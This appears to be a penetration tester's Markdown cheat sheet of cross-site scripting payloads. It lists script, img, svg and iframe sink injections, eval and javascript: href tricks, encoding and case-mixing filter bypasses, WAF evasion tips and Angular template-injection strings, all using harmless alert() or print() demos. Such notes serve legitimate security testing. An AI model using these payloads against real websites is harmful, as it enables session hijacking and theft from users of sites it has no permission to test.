# XSS
**Useful cheatsheet [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**
**Comprehensive payload list [here](https://github.com/payloadbox/xss-payload-list)**
## POC
- `alert(document.location)`
- `print()`
## Unescaped Tags -> [Script Tags](3.%20Methodology/3.1%20Enumeration/XSS.md#Script%20Tags)
- `<b>STUFF</b>`
- `<b>STUFF`
### Encodings
**Worth double encoding**
- `%3cb%3eSTUFF%3c%2fb%3e`
- `&#x3c;b&#x3e;STUFF&#x3c;&#x2f;b&#x3e;`

# Sinks
## Tag XSS
### Script
- `<script>print()</script>`
- ``<script>alert`1`</script>``
- `<SrCiPt>print()</SCriPT>`
### Img
- `<img src="" onerror="print()" />`
- ``<img src=1 onerror=alert`1`>``
- `<svg onload="alert()" />`
### Iframe
- `<iframe onload="alert()" />`
- `<iframe onreadystatechange="alert()" />`
#### Manipulating Iframe
- `this.contentWindow`

## Eval
- `"-print()"`
- `";print()"`

## Href
- `javascript:alert()`

# Bypassing WAF
**Brute force allowed tags/attributes**
**Remember attributes may be blocked only on specific tags - Check all combinations**
**Remember to use Iframes where necessary**
## Neat Tricks
- Focus on element with ID -> `<URL>#<ID>`

# Angular XSS
**Identify page runs Angular first. Wappalyzer works well**
**Head of page will point to Angular source**
## ng-app
- `{{constructor.constructor('alert()')()}}`
- `{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}`

